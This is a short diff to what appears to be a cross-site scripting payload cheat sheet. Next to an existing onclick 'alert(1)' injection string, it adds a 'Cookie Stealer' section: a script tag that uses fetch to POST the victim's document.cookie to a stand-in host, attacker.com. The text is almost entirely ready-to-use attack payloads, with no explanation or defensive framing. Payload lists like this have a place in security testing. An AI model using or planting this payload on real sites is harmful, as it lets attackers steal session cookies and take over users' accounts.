@@ -37,5 +37,13 @@ onclick event
 -------------
 http://foo?&apos;-alert(1)-&apos;
 
-
+Cookie Stealer
+---------------
+<script>
+fetch('https://attacker.com', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
 
